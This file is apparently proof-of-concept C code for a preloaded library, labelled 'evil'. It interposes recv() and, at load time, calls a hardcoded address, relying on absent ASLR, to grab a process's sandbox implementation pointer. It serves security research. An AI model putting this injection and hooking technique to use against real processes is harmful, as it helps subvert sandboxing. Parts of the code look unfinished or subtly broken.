/*
 * Copyright (c) 2018, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 *    * Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *    * Redistributions in binary form must reproduce the above
 *      copyright notice, this list of conditions and the following
 *      disclaimer in the documentation and/or other materials
 *      provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
 * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include "microevil.h"

ssize_t (*orig_recv)(int, void *, size_t, int);
static sandbox_impl_t *(*sbox_get_impl)(void);
static sandbox_impl_t *sbox;

ssize_t
recv(int s, void *msg, size_t len, int flags)
{
	static int output = 0;
	ssize_t res;

	memset(msg, 0, len);
	res = orig_recv(s, msg, len, flags);
	return (res);
}

__attribute__((constructor)) void
init(void)
{
	void *p;
	int err;

	/* No ASLR! Woohoo! */
	p = (void *)((unsigned long)0x00000000011cab60);

	printf("[+] minievil loaded!\n");

	sbox_get_impl = p;

	sbox = sbox_get_impl();
	printf("sbox is 0x%016lx\n", (unsigned long)sbox);

	orig_recv = dlsym(NULL, "recv");
	if (orig_recv == NULL) {
		exit(1);
	}

	printf("orig_recv: 0x%016lx\n", (unsigned long)orig_recv);
	printf("recv: 0x%016lx\n", (unsigned long)recv);
}
